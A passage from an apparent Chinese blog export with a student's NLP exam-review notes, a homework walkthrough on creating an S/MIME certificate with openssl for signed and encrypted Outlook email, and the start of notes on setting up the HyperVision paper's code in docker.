表示为t轮消息传递后Xi对应的共享潜在向量的值。\n共享潜在向量序列用作不同任务特定组件的输入。每个特定于任务的组件都有自己的潜在变量和输出变量集。输出变量对应于序列标签任务中的标签序列；在AE中，我们为每个令牌分配一个标签，表明它是否属于任何aspect或opinion，而在AS中，我们为每个单词加上它的情感标签。在分类任务中，输出对应于输入实例的标签：情感分类任务(DS)的文档的情感，以及领域分类任务(DD)的文档域。在每次迭代中，适当的信息被传递回共享的潜在向量以进行组合；这可以是输出变量的值，也可以是潜在变量的值，具体取决于任务。 此外，我们还允许在每次迭代中在组件之间传递消息（opinion transmission）。\n感觉有点训练词向量的感觉，像是预处理一下得到向量序列来方便其他任务。\n【超，好像这些都不是考试重点】\n属性级情感分类 For exam 试卷题型：简答题 40 分（5*8）好多个问号（内容为胡老师讲的基础部分）+ 综合题 60 分（内容为曹老师讲的核心应用部分）\n简答题重点章节：\n什么是语言模型、神经网络语言模型、几种、特点（优点）\n概念性的简答题， 不难+\n第4章 语言模型+词向量 （要求掌握：语言模型概念，神经网络语言模型 ）\n第 5章 NLP中的注意力机制 （全部要求掌握）概念、用处\n第 7 章 预训练语言模型（全部要求掌握）[主要掌握GPT，BERT 是 怎么训练的，与下游任务是如何对接的]prompt，inconcert learning，思维链【建模的几种范式】\n主观题重点章节： 设计东西\n第9章 情感分析（要求掌握：方面级情感分析基本方法原理）\n第10章 信息抽取 （要求掌握：实体和关系联合抽取基本方法原理）\n第 11章 问答系统（要求掌握：检索式问答系统基本方法原理）\n语言模型概念 神经网络语言模型 统计的方法使用最大似然估计，需要数据平滑否则会出现0概率问题。\n神经网络使用DNN和RNN\n利用RNN 语言模型可以解决以上概率语言模型问题，在神经网络一般用RNN语言模型\n一些（我不会的）背景知识 梯度下降算法 梯度下降法是一种常用的优化算法，主要用于找到函数的局部最小值。它的基本思想是：在每一步迭代过程中，选择函数在当前点的负梯度（即函数在该点下降最快的方向）作为搜索方向，然后按照一定的步长向该方向更新当前点，不断迭代，直到满足停止准则。\n具体来说，假设我们要最小化一个可微函数$f(x)$，我们首先随机选择一个初始点$x_0$，然后按照以下规则更新$x$：\n$$ x_{n+1} = x_n - \\alpha \\nabla f(x_n) $$其中，$\\nabla f(x_n)$是函数$f$在点$x_n$处的梯度，$\\alpha$是步长（也称为学习率），控制着每一步更新的幅度。\n梯度下降法只能保证找到局部最小值\n双曲正切函数 它解决了Sigmoid函数的不以0为中心输出问题，然而，梯度消失的问题和幂运算的问题仍然存在\n$\\tanh(x)=\\frac{e^x-e^{-x}}{e^x+e^{-x}}$\nBP算法 反向传播算法，当正向传播得到的结果和预期不符，则反向传播，修改权重\nBPTT算法 是BP算法的拓展，可以处理具有时间序列结构的数据，用于训练RNN\nBPTT的工作原理如下：\n正向传播 ：在每个时间步，网络会读取输入并计算输出。这个过程会持续进行，直到处理完所有的输入序列。 反向传播 ：一旦完成所有的正向传播步骤，网络就会计算最后一个时间步的误差（即网络的预测与实际值之间的差距），然后将这个误差反向传播到前一个时间步。这个过程会持续进行，直到误差被传播回第一个时间步。 参数更新 ：在误差反向传播的过程中，网络会计算误差关于每个参数的梯度。然后，这些梯度会被用来更新网络的参数。 one-hot编码 独热编码是一种将离散的分类标签转换为二进制向量的方法\n假设我们要做一个分类任务，总共有3个类别，分别是猫、狗、人。那这三个类别就是一种离散的分类：它们之间互相独立，不存在谁比谁大、谁比谁先、谁比谁后的关系。\n在神经网络中，需要一种数学的表示方法，来表示猫、狗、人的分类。最容易想到的，便是以 0 代表猫，以 1 代表狗，以 2 代表人这种简单粗暴的方式。但这样会导致分类标签之间出现了不对等的情况。（2比1大……）\n而进行如下的编码的话就可以解决这个问题：\n猫：[1, 0, 0] 狗：[0, 1, 0] 人：[0, 0, 1] 这就是独热码\npairwise \u0026ldquo;Pairwise\u0026quot;是一种常用于排序和推荐系统的方法。它的主要思想是将排序问题转换为二元分类问题。每次取一对样本，预估这一对样本的先后顺序，不断重复预估一对对样本，从而得到某条查询下完整的排序。如果文档A的相关性高于文档B，则赋值+1，反之则赋值-1。这样，我们就得到了二元分类器训练所需的训练样本\nPairwise方法也有其缺点。例如，它只考虑了两篇文档的相对顺序，没有考虑他们出现在搜索结果列表中的位置。\n除了Pairwise，还有其他的方法如Pointwise和Listwise。Pointwise方法每次仅仅考虑一个样本，预估的是每一条和查询的相关性，基于此进行排序。而Listwise方法则同时考虑多个样本，找到最优顺序。这些方法各有优缺点，选择哪种方法取决于具体的应用场景和需求。\nzero-shot \u0026ldquo;Zero-shot learning\u0026rdquo;（零样本学习）是一种机器学习范式，它允许模型在没有先前训练过相关数据集的情况下，对不包含在训练数据中的类别或任务进行准确的预测或推断。这种能力是由先进的深度学习模型和迁移学习方法得以实现的。\n举个例子，假设我们的模型已经能够识别马，老虎和熊猫了，现在需要该模型也识别斑马，那么我们需要告诉模型，怎样的对象才是斑马，但是并不能直接让模型看见斑马。所以模型需要知道的信息是马的样本、老虎的样本、熊猫的样本和样本的标签，以及关于前三种动物和斑马的描述。\n这种方法的优点是可以极大地节省标注量。不需要增加样本，只需要增加描述即可。\nPPO PPO（Proximal Policy Optimization，近端策略优化）是一种强化学习算法，由OpenAI在2017年提出。PPO算法的目标是解决深度强化学习中策略优化的问题。\nPPO算法的核心在于更新策略梯度，主流方法有两种，分别是KL散度做penalty，另一种是Clip剪裁，它们的主要作用都是限制策略梯度更新的幅度，从而推导出不同的神经网络参数更新方式。\nPPO算法具备Policy Gradient、TRPO的部分优点，采样数据和使用随机梯度上升方法优化代替目标函数之间交替进行，虽然标准的策略梯度方法对每个数据样本执行一次梯度更新，但PPO提出新目标函数，可以实现小批量更新。\nDNN（NNLM） 2-gram（bigram） 其中$\\theta$就是训练过程中要学习的参数，有了这些参数就可以直接的到 $p(w_i|w_{i-1})$， 找到一组足够好的参数，就能让得到的$p(w_i|w_{i-1})$最接近训练语料库\n这里的最大化就是损失函数最小（最接近0），因为P永远小于1，所以log永远是负数，他们加起来永远小于0，让log最大，也就是让log最接近0\nn-gram 拓展一下罢了\nRNN（RNNLM） 词向量 自然语言问题要用计算机处理时，第一步要找一种方法把这些符号数字化，成为计算机方便处理的形式化表示\nNNLM模型词向量 RNNLM模型词向量 C\u0026amp;W 模型词向量 CBOW 模型词向量 Skip-gram模型词向量 不同模型的词向量之间的主要区别在于它们捕获和编码词义和上下文信息的方式。以下是一些常见模型的词向量特点：\n神经网络语言模型（NNLM） ：NNLM通过学习预测下一个词的任务来生成词向量。这种方法可以捕获词义和词之间的关系，但是它通常无法捕获长距离的依赖关系，因为它只考虑了固定大小的上下文。 循环神经网络语言模型（RNNLM） ：RNNLM使用循环神经网络结构，可以处理变长的输入序列，并能捕获长距离的依赖关系。因此，RNNLM生成的词向量可以包含更丰富的上下文信息。 Word2Vec ：Word2Vec是一种预训练词向量的方法，它包括两种模型：Skip-gram和CBOW。Skip-gram模型通过一个词预测其上下文，而CBOW模型则通过上下文预测一个词。Word2Vec生成的词向量可以捕获词义和词之间的各种关系，如同义词、反义词、类比关系等。 GloVe ：GloVe（Global Vectors for Word Representation）是另一种预训练词向量的方法，它通过对词-词共现矩阵进行分解来生成词向量。GloVe生成的词向量可以捕获词义和词之间的线性关系。 BERT ：BERT（Bidirectional Encoder Representations from Transformers）使用Transformer模型结构，并通过预训练任务（如Masked Language Model和Next Sentence Prediction）来生成词向量。BERT生成的词向量是上下文相关的，也就是说，同一个词在不同的上下文中可能有不同的词向量。 总的来说，不同模型的词向量之间的区别主要在于它们捕获和编码词义和上下文信息的方式。选择哪种词向量取决于具体的任务需求和计算资源。\nNNLM的词向量 解决办法\n通过一个|D| * |V|的矩阵，额可以将one-shot的编码转为D维的稠密的词向量，所以管他叫lookup表\nNNLM 语言模型在训练语言模型同时也训练了词向量\nRNNLM的词向量 C\u0026amp;W C\u0026amp;W模型是靠两边猜中间的一种模型，输入层是wi上下文的词向量\nscore是wi中间这个word在这个位置有多合理，越高越合理。\n正样本通常是指在实际语料库中出现过的词语及其上下文。负样本则是人为构造的，通常是将一个词与一个随机的上下文配对。\nPairwise方法在训练C\u0026amp;W词向量时，主要是通过比较一对词的上下文来进行训练的。具体来说，对于每一对词（一个正样本和一个负样本），我们都会计算它们的词向量，并通过比较这两个词向量的相似度来更新我们的模型。\n在训练过程中，我们首先需要选择一个损失函数，这里是修改后的HingeLoss\n然后，我们会使用一种优化算法来最小化这个损失函数，这里是梯度下降，在每一次迭代中，我们都会根据当前的损失来更新我们的词向量。\n训练的目标是在正样本中的score高，负样本的score低，然后score差的越大效果越好\nCBOW CBOW也是靠两边猜中间，输入层是wi上下文词向量的平均值，目标是最小化（最收敛与0）上下文词的平均与目标词之间的距离。输出是\nskip-gram skip-gram是知道中间猜两边，训练最小化（最收敛于0）目标词与上下文词之间的距离。\n注意力机制 概述 在注意力机制中，Q、K、V 分别代表查询（Query）、键（Key）和值（Value）。\n注意力机制的工作过程可以简单概括为：对于每一个查询，计算它与所有键的匹配程度（通常使用点积），然后对这些匹配程度进行归一化（通常使用 softmax 函数），得到每个键对应的权重。最后，用这些权重对所有的值进行加权求和，得到最终的输出。\n这种机制允许模型在处理一个元素时，考虑到其他相关元素的信息，从而捕捉输入元素之间的依赖关系。在自然语言处理、计算机视觉等领域，注意力机制已经被广泛应用，并取得了显著的效果。\nW是权重，都是学来的。\n参考\nKQV矩阵： https://www.bilibili.com/video/BV1dt4y1J7ov/?share_source=copy_web\u0026vd_source=2fbfeabcc6cdd857dcd6247eb0154d83\nAttention机制： https://www.bilibili.com/video/BV1YA411G7Ep\nK、V都是经过线性变换的词向量集合（矩阵）\nQ是隐藏状态（隐藏向量）\nA是一个注意力值，就是我们设置的这个字的注意力值\n通过attention的学习，可以得到a1、a2……，这些就是K中各个向量对Q的权重\n步骤1：计算 f ( Q ,Ki )\n步骤2：计算对于Q 各个 Ki 的权重\n步骤3：计算输出 Att-V值（各 Ki 乘以自己的权重，然后求和 ）\n举例1， seq2seq（RNN2RNN）的机器翻译中 seq2seq做机器翻译的过程，需要大量的两种语言的平行语料，就是意思相同的语言的一一对应的关系。\n其中x为词向量，A为权重矩阵，h为隐藏状态（隐藏向量）。\nRNN是用预训练的词向量，然后通过学习权重矩阵A来微调，得到隐藏状态，可以理解为隐藏状态是带了上下文的更加符合RNN的词的向量表示。\n每一个时间步中，A都被微调， 因此x1、x2、x3的A可能都是不一样的。在大量预料的训练下会获得表现比较好的A和A'\nh可以表示为$h_t = f(W_{hh}h_{t-1} + W_{xh}x_t + b_h)$其中$h_t$ 是当前时间步的隐藏状态，$h_{t-1}$ 是前一时间步的隐藏状态，$x_t$ 是当前时间步的输入，$W_{hh}$ 和 $W_{xh}$ 是权重矩阵，$b_h$ 是偏置项，$f$ 是激活函数\n不加注意力机智的seq2seq模型，encoder是RNN，decoder也是RNN，在encoder接受了$x_1$到$x_m$的词向量序列后，得到最终的隐藏状态$h_m$， 也就是$s_0$，作为decoder的初始状态。\n如果不加注意力机制，decoder那边也就是靠隐藏状态、x和参数（A矩阵，偏置值b）来继续进行RNN的步骤。\n现在我们引入注意力机制，也就是图上的$c_0$，权重的计算按照上面所说的KQV计算方法，这里K是词向量集合x1,x2\u0026hellip; Q是隐藏状态。也就是对于每一个隐藏状态，都可以求一个关于词向量序列的权重值$\\alpha$。\n通过求出这一系列的$\\alpha$，就可以加权求出上下文矩阵$c$，c知道当前隐藏状态和词向量矩阵的全部关系。\n加了注意力机制之后，decoder的各个隐藏状态求解过程就会向之前提到的那样变得更复杂\n而每一个步骤的c都不一样，比如\nc0是s0对于x1,x2\u0026hellip;的att-V，也就是hm对于x1,x2\u0026hellip;的att-V；c1是隐藏状态s1对于x1,x2\u0026hellip;的att-V，c2是隐藏状态s2对于x1,x2\u0026hellip;的att-V这些c都需要花算力来算\n注意力机制的问题是时间复杂度太大了。如果是简单的RNN2RNN，如果encoder词向量矩阵大小为m，decoder词向量矩阵大小为n，所需的时间复杂度为O(m+n)，而使用注意力机制之后就会变成O(mn)，还是打分函数比较简单的情况下。\n注意力编码机制 attention机制还可以将不同序列融合编码（将多个序列经过某种处理或嵌入方式，转换为一个固定长度的向量或表示形式。）\n就是给每个词向量乘个权重加起来，被称作注意力池化（Attention Pooling）或加权求和（Weighted Sum）。这个操作的含义是将注意力权重分配给输入序列中的不同部分，从而形成一个汇聚了注意力的向量表示。\n这个操作的效果是聚焦于输入序列中具有更高注意力权重的部分，形成一个综合的表示，其中对于重要的部分有更大的贡献。这对于处理序列数据中的上下文信息，关注重要元素，以及实现对不同部分不同程度的关注都非常有用，特别是在自然语言处理中的任务中。\n预训练语言模型 迁移学习 迁移学习（Transfer Learning）是一种机器学习方法，其核心思想是利用已有的知识来辅助学习新的知识。例如，已经会下中国象棋，就可以类比着来学习国际象棋；已经会编写Java程序，就可以类比着来学习C#。\n迁移学习通常会关注有一个源域（源任务） $D_ {s}$ 和一个目标域（目标任务） $D_ {t}$ 的情况.\n迁移方式分为两种\n几个范式 第三范式：预训练-精调范式 自回归：预测序列的下一个或者上一个\n自编码：预测序列中的某一个或某几个\n广义自回归：和自回归主要区别在于他们处理输入数据的方式。自回归预训练语言模型在生成序列时，会一个接一个地生成新的词，每个新词都依赖于前面的词。如GPT，而广义自回归预训练语言模型则更为灵活，它们可以在生成序列时考虑更多的上下文信息，模型不仅可以查看前面的词，还可以查看后面的词或者整个序列。如XLNet\nGPT训练和对接 GPT 采用了 Transformer 的 Decoder 部分，并且每个子层只有一个 Masked Multi Self-Attention（768 维向量和 12 个 Attention Head）和一个FeedForward （无普通transformer解码器层的编码器-解码器注意力子层），模型共叠加使用了 12 层的 Decoder。使用了从左向右的单向注意力机制\nMasked Multi Self-Attention的768维向量和12个attention head： 意思是12个独立的attention组件，每个组件的参数都独立，然后每个attention的Q向量都是768维，也可以理解为一个词在模型中的向量（或者说词嵌入）是768维]\nfeedforward： 作用是提取更深层次的特征。在每个序列的位置单独应用一个全连接前馈网络，由两个线性层和一个激活函数组成。线性层将每个位置的表示扩展，为学习更复杂的特征提供可能性，激活函数帮助模型学习更复杂的非线性特征，第二个线性层将每个位置的表示压缩回原始维度。这样，位置特征敏感的部分就会被表达出来，提供给后续网络学习。\n就是十二个下图这样的小东西\ntransformer输入有token embedding和position embedding\n对比一下transformer，transformer的decoder是6个右边的，少了一层multi-head attention的encoder-decoder注意力子层（cross-attention的那个子模块）\n6层attention堆叠就是六个encoder就是个小的encoder，每个encoder里都有attention机制，上图N=6的意思。\n训练：\nmaximize负数=近0最小化\n与下游任务对接：\n把多序列通过一些特定的规则拼成一个单序列。\n微调：\n任务微调有2种方式 ：① 只调任务参数 ② 任务参数和预训练模型参数一起调，这样可以让预训练模型更加适配任务\n举例：\n这儿的$L_1(C)$是上面提到的预训练过程中的\nBERT训练和对接 用了transformer的encoder再加FFN（前馈神经网络，FFN 层有助于学习序列中的非线性关系和模式）层\n【但是transformer的encoder不是带FeedForward吗？】FFN仅在MLM过程中有用，而BERT的最终输出是模型在整个预训练过程中学到的表示的某种组合。这些表示在后续的任务中可以进一步微调或者用作特征。（BYD，原来只是训练过程中的一个b东西）\n下图中一个trm是一个子层，\n在BERT模型中，输入的每个单词都会通过三种嵌入（embedding）进行编码\nToken Embedding：是将每个单词或者词片映射到一个向量，这个向量能够捕获该单词的语义信息。在BERT中，使用了WordPiece标记化，其中输入句子的每个单词都被分解成子词标记。这些标记的嵌入是随机初始化的，然后通过梯度下降进行训练。\nSegment Embedding：是用来区分不同的句子的。在处理两个句子的任务（如自然语言推理）时，BERT需要知道每个单词属于哪个句子。\nPosition Embedding：由于Transformer模型并没有像循环神经网络那样的顺序性，因此需要显式地向模型添加位置信息，以保留句子中单词的顺序信息\n训练：\nMLM：把一个序列的几个word给mask了让模型猜的训练方法。\n(2).句子顺序模型训练\n凑一些下一句不是下一句的负样本来训练预训练模型对句子顺序的敏感。\n对接：\n微调同样有两种① 只调任务参数 ② 任务参数和预训练模型参数一起调，这样可以让预训练模型更加适配任务\n其他 RoBERTa：把BERT使用Adam默认的参数改为使用更大的batches，训练时把静态mask改为动态mask。\nBART：GPT只用了transformer的decoder，BERT只用了transformer的encoder。导致\nBERT具备双向语言理解能力的却不具备做生成任务的能力。GPT拥有自回归特性的却不能更好的从双向理解语言.\n（模型的\u0026quot;自回归\u0026quot;特性指的是，当前的观察值是过去观察值的加权平均和一个随机项）\nBART使用标准的Transformer结构为基础，吸纳BERT和GPT的优点，使用多种噪声破坏原文本，再将残缺文本通过序列到序列的任务重新复原（降噪自监督）\nBERT在预测时加了额外的FFN, 而BART没使用FFN.\n（还记得这个Beyond吗）\nT5\n给整个 NLP 预训练模型领域提供了一个通用框架，把所有NLP任务都转化成一种形式(Text-to-Text)，通过这样的方式可以用同样的模型，同样的损失函数，同样的训练过程，同样的解码过程来完成所有 NLP 任务。以后的各种NLP任务，只需针对一个超大预训练模型，考虑怎么把任转换成合适的文本输入输出。\n第四范式：预训练，提示，预测范式（Pre-train,Prompt,Predict） prompt挖掘工程\n特点：不通过目标工程使预训练的语言模型（LM）适应下游任务，而是将下游任务建模的方式重新定义（Reformulate），通过利用合适prompt实现不对预训练语言模型改动太多，尽量在原始 LM上解决任务的问题。\n实现方法eg：\n要素：\n输入端\nprompt工程\n完形填空和前缀提示\n模板创建\n输出端\n方法\n微调\n生成类任务用法与第五范式相同\n第五范式：大模型 大语言模型 (Large Language Model，LLM) 通常指由大量参数（通常数十亿个权重或更多）组成的人工神经网络预训练语言模型，使用大量的计算资源在海量数据上进行训练。\n大型语言模型是通用的模型，在广泛的任务（例如情感分析、命名实体识别或数学推理）中表现出色，具有与人类认证对齐的特点。\n不需要任务模型的意思是只要有预训练就行\n（我靠，这要传统注意力算死了）\n学习方法\n因为上下文学习，在使用的时候也可以用zero-shot, one-shot和few-shot。\nchain-of-thought\n与人类对齐：RLHF\n简而言之：1、在人工标注数据上SFT（有监督微调）模型\n2、多模型给标注人员做排序，用来训练奖励模型（RM）\n3、使用强化学习PPO算法，交互地优化模型参数。\n文本分类在各个范式上的例子\n方面级情感分类 方面级情感分类（Aspect-Level Sentiment Classification）是自然语言处理（NLP）中的一个任务，它的目标是识别文本中特定方面的情感倾向。例如，在产品评论中，“这款手机的电池寿命很长，但屏幕质量差。”这句话中，“电池寿命”这个方面的情感是积极的，而“屏幕质量”这个方面的情感是消极的。所以，方面级情感分类不仅要识别出文本中的各个方面，还要判断这些方面的情感倾向。这个任务在许多领域都有应用，比如产品评论分析、社交媒体监控等。\n问题定义\n基本方法、原理 子任务等：\nEntity/Target：评论的对象或者物品是什么，例如某个餐厅，某款手机。\u0026ldquo;Target\u0026quot;这个词用的比较模糊，其既可以被当作Entity，又可以当作Aspect Term。和在AE里提到的opinion target是一个意思。\nAspect：隶属于某个Entity的属性。在这里其因为学者提出的任务类型不同，又分为两类：\nAspect Term：存在在句子中的Aspect。例如例句中的”拍照“、”电池“、”外观“。 Aspect Category：预先给定的Aspect。例如，我们想知道评论对”华为手机“的”外观“、”售后服务“、”便携性“三个aspect的情感极性。 LSTM LSTM 方法先将所有变长的句子均表示为一种固定长度的向量，具体做法是将最后一个word对应的计算得到的 hidden vector 作为整句话的表示（sentence vector）。之后，将最后得到的这个 sentence vector 送入一个 linear layer，使其输出为一个维度为情绪种类个数。最后对 linear layer 得出的结果做 softmax 并依次为依据选出该句（同时也是 target）的情绪分类。\nTD-LSTM 将输入的句子根据 aspect 分为两部分，两边都朝着 aspect 的方向分别同时把 words 送入两个 LSTM 中\nTC-LSTM 与 TD-LSTM 唯一的不同就是在 input 时在每个 word embedding vector 后面拼接上 aspect vector（如果 aspect 中有多个 word，则取平均）\nAT-LSTM 对隐藏状态h和aspect的词嵌入后施加attention\nATAE-LSTM 在LSTM的输入方面在concat一个aspect的词向量，说明aspect的重要性\nIAN IAN 模型由两部分组成，两部分分别对 Target 和 Context 进行建模。每一部分都以词嵌入作为输入，再通过 LSTM 获取每个词的隐藏状态，最后取所有隐藏向量的平均值，用它来监督另一部分注意力向量的生成。attention学习隐藏状态和对应词向量序列的相关性。\nattention部分是$h_t^i$\u0026amp;$avg(h_c)$在target上做注意力，$h_c^i$\u0026amp;$avg(h_t)$在context上做注意力\n实体和关系联合抽取 信息抽取：从自然语言文本中抽取指定类型的实体、 关系、 事件等事实信息，并形成结构化数据输出的文本处理技术。一般情况下信息抽取别是知识抽取等其他任务的基础。主要在对无结构数据的抽取出现问题\n基本方法原理 名词解释 span：指的是文本中的一段连续的子串，这段子串对应于某个实体或者关系的具体文本表述。\nDyGIE 问题定义：\n输入：所有句中可能的spans序列集合。\n输出三种信息：实体类型，关系分类（同一句），指代链接（跨句）；\nToken Representation Layer（Token表示层）：BiLSTM\nSpan Representation Layer（span表示层）： 初始化来自BiLSTM输出联合起来，加入基于注意力模型。\nCoreference Propagation Layer（指代传播层）：N次传播处理，跨span共享上下文信息\nRelation Propagation Layer（关系传播层）：与指代传播层相似\nFinal Prediction Layer（最终预测层）：去预测任务—实体任务，关系任务\nOneIE 任务定义：给定一个输入的句子，输出一个图，图中节点(含节点类型)代表实体提及或者触发词，图中的边表示表示节点之间的关系\n条件随机场（Conditional Random Field，CRF）是一种在自然语言处理（NLP）中广泛使用的模型。CRF的主要作用是解决序列数据的标注问题，它能够考虑整个序列的上下文信息，以做出更准确的预测。\nBeam Search（集束搜索）是一种启发式图搜索算法，通常用在图的解空间比较大的情况下，为了减少搜索所占用的空间和时间，在每一步深度扩展的时候，剪掉一些质量比较差的结点，保留下一些质量较高的结点。Beam Search不保证全局最优，但是比greedy search搜索空间更大，一般结果比greedy search要好。\n在这里只保留最好的\nUIE UniEX 检索式问答系统 1、问题分析模块：问题分类和关键词提取\n问题分类：\n关键词提取：根据问题分类，用序列标注法抽取相应类别的实体做为检索关键词\n2、检索模块：检索问题答案所在文档与段落\n3、 答案抽取模块：在相关片段中抽取备选答案，并对备选答案进行排序\n实现方法：\n流水线方式 Document Retriever + Reading Comprehension Reader框架\nDrQA TF-IDF：（Term Frequency-Inverse Document Frequency，词频-逆文件频率）是一种用于信息检索和数据挖掘的常用加权技术。它是一种统计方法，用以评估一字词对于一个文件集或一个语料库中的其中一份文件的重要程度\n使用TF-IDF获取与问题topK相关的文档\n然后将对topK使用抽取式阅读理解，从原文中抽取出可以回答的文本\nEvidence Aggregation for Answer Re-Ranking in Open-Domain Question Answering 有些问题需要来自不同来源的证据相结合才能正确回答。解决方法：strength-based re-ranker\u0026amp;coverage-based re-ranker\nstrength-based re-ranker的基本思想是，正确的答案通常会被更多的段落反复提及\ncoverage-based re-ranker考虑每个答案在覆盖不同证据方面的能力，这里用一个BiLSTM来计算答案支撑片段的相似表征【指一个答案和它的支撑片段在表征空间中的相似度】，在垮文本上的相似表征很很高说明这个答案更可靠\n端到端方式 Retriever-Reader的联合学习 ORQA: Open-Retriever Question Answering 问题引入：\n1）需要具有强监督的支持证据：监督数据难以获得\n2）利用IR（信息检索）系统检索候选证据：QA与IR存在一定差异性，IR更关注词法或语义相似性，QA对于语言理解层次更丰富\n就是一个S是打分函数。评价retrieval和评价reader是两个不同的，$s_{retr}$是评价这个block和问题的相关性的，$S_{read}$是评价块儿里的文本和q的相关性的。这个里面的bert是用来理解retrieval和question的。\n每个块通过BERT和权重矩阵b生成隐藏向量h，问题通过BERT和权重矩阵q生成隐藏向量h，通过点积判断相关性\nBERT_R+MLP生成s，给S_read来评分\n有监督训练，需要手标与a有关的s\n有挑战，但是懒得管了\n基于预训练的Retriever-Free方法 对预训练模型进行微调，使其能够在没有任何外部上下文或知识的情况下回答问题\n使用span corruption来预训练\nSpan Corruption是T5模型预训练任务中的一种方法。它将完整的句子根据随机的span进行掩码。例如，原句：“Thank you for inviting me to your party last week”，Span Corruption之后可能得到输入：“Thank you [X] me to your party [Y] week”，目标：“[X] for inviting [Y] last [Z]”。其中[X]等一系列辅助编码称为sentinels。\n这种方法的目标是让模型学习如何从被打乱或被掩码的句子中恢复出原始的句子。\nLLM在问答任务上与有监督微调效果不相上下\nLLM在计数、多跳推理、日期、因果等类型上的性能较弱\n最后一节课 讲了一节课的对话系统（不考）\n参考：https://blog.csdn.net/ld326/article/details/112802292\n","date":"2023-12-27T19:07:00+08:00","image":"http://localhost:1313/p/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86%E7%AC%94%E8%AE%B0/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86%E7%AC%94%E8%AE%B0/nlp_hu13407295661878239442.png","permalink":"http://localhost:1313/p/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86%E7%AC%94%E8%AE%B0/","title":"自然语言处理笔记"},{"content":"为了避免跨平台的问题，直接用choco在windows上安装openssl 3.1.1\nchoco install openssl\n首先生成私钥\n1 openssl genrsa -aes256 -out private.pem 4096 其中\ngenrsa是openssl的一个命令，用于生成RSA私钥。\n-aes256表示在输出私钥之前，使用AES 256加密\n-out private.pem 表示将生成的私钥输出到名为private.pem的文件中\n4096表示生成的私钥的位数，即私钥的长度为4096位\n然后使用私钥生成证书\n1 openssl req -new -x509 -days 365 -key .\\private.pem -out cacert.crt -config .\\smime.cnf -extensions smime 其中\nreq是openssl的一个命令，用于创建和处理PKCS#10格式的证书请求。\n-new表示创建一个新的证书请求。\n-x509表示生成一个自签名的证书，而不是生成一个证书请求。\n-days 365表示生成的证书的有效期为365天。\n-key .\\private.pem表示使用名为private.pem的文件中的私钥来签署证书。\n-out cacert.crt表示将生成的证书输出到名为cacert.crt的文件中。\n-config .\\smime.cnf表示使用名为smime.cnf的文件作为配置文件。\n-extensions smime表示应该包含配置文件中名为smime的部分中指定的扩展。\nsmime的部分为\n1 2 3 4 5 6 7 [smime] basicConstraints = CA:FALSE keyUsage = nonRepudiation, digitalSignature, keyEncipherment extendedKeyUsage = emailProtection subjectKeyIdentifier = hash authorityKeyIdentifier = keyid:always, issuer subjectAltName = email:copy basicConstraints = CA:FALSE指定证书不能用作CA（证书颁发机构）\nkeyUsage = nonRepudiation, digitalSignature, keyEncipherment指定证书的公钥可以用于哪些用途。这个证书可以用于非否认（nonRepudiation）、数字签名（digitalSignature）和密钥封装（keyEncipherment）\nextendedKeyUsage = emailProtection用于电子邮件保护（emailProtection）\nsubjectKeyIdentifier = hash用公钥的hash值唯一地标识证书中的公钥。\nauthorityKeyIdentifier = keyid:always, issuer用于标识签署此证书的CA的公钥。这个扩展通常包含CA公钥的keyid（一个唯一标识符），以及CA的名称（issuer）。keyid:always表示总是包含keyid，无论是否需要\nsubjectAltName = email:copy用于指定证书的主题可选名称（Subject Alternative Name）。主题可选名称是电子邮件地址，该地址从证书的主题名称字段中复制\n生成的时候国家地区公司啥的都不重要，我直接敲回车按默认了。邮箱写自己的就行了。\n直接用windwos自带的证书查看器查看这个证书。\n版本v3是指我们使用了x.509第3版本，然后序列号是有证书生成算法生成的，唯一的指定这个证书，像身份证号似的。签名算法和哈希算法是一个声明，颁发者是我们刚才在生成证书时写的。有效期由我们刚才的 -days 参数指明，使用者和颁发者一样。\n公钥直接在证书文件里保存。公钥参数0500表示NULL，这是因为RSA的公钥的参数（模数和公开指数）已经在公钥字段中给出，所以不需要在公钥参数字段中再给出，如果是其他的加密算法，可能会包含其他信息。\n基本约束\nSubject Type=End Entity ：这表示该证书是一个终端实体证书，而不是CA（证书颁发机构）证书。也就是说这个证书不能用于签发/创建其他证书。Path Length Constraint=None ：这表示路径长度没有设置，准许其签发多级的数字证书。然而，由于Subject Type=End Entity，这个证书不能用于签发其他证书，所以这个设置在这种情况下没有意义。这是由于我们使用了 basicConstraints = CA:FALSE的选项。\n下面的其他拓展都在-extension部分说过了，这里就不多赘述了。\n然后安装这个证书，并且选择保存路径为受信任的根证书颁发机构\n我使用的客户端是outlook。使用的邮箱服务是qq邮箱。\n在outlook里添加我的证书\n这里outlook只支持导入pfx，所以我们需要把生成的证书格式转换\n1 openssl pkcs12 -export -out cacert.pfx -inkey .\\private.pem -in .\\cacert.crt 接下来是导入助教的证书，首先在outlook里新建一个联系人\n导入，这里又只支持.cer了，我的windows下的openssl好像缺了库没法转，所以用wsl里的openssl转了一下\n1 openssl pkcs12 -in limengjie22\\@mails.ucas.ac.cn.pfx -nokeys -out output.cer openssl pkcs12 -nokeys命令用于从PKCS#12文件（通常具有.pfx或.p12扩展名）中提取证书，-nokeys指定不包含私钥，这样生成的output.cer不能做任何需要私钥的操作（我们也没有要用私钥的操作）\nimport password即使提供的私钥.txt的内容。然后就可以成功导入了\n然后在发送邮件的时候，在选项里把加密和签署都点了\n","date":"2023-11-29T19:56:28+08:00","image":"http://localhost:1313/p/%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF%E4%BD%9C%E4%B8%9A%E4%B8%89/%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF%E4%BD%9C%E4%B8%9A%E4%B8%89/1701255501352_hu9932465021750591616.png","permalink":"http://localhost:1313/p/%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF%E4%BD%9C%E4%B8%9A%E4%B8%89/","title":"网络认证技术作业三"},{"content":"导语 复现这篇2023NDSS论文，他大开源在https://github.com/fuchuanpu/HyperVision\n环境配置 我是在home下做的，如果想在别的地方搞稍微换下路径就行\n先拉git的代码 git clone https://github.com/fuchuanpu/HyperVision.git\n依照作者在readme里说，在纯净的ubuntu22.04上运行他的脚本即可。用docker装一个纯净的ubuntu22.04\n1 2 3 4 5 6 # 下载镜像 docker pull homebrew/ubuntu22.04:latest # 启动，并且把~/HyperVision 和容器内的/root/HyperVision连起来 docker run -td --name hypervision -v 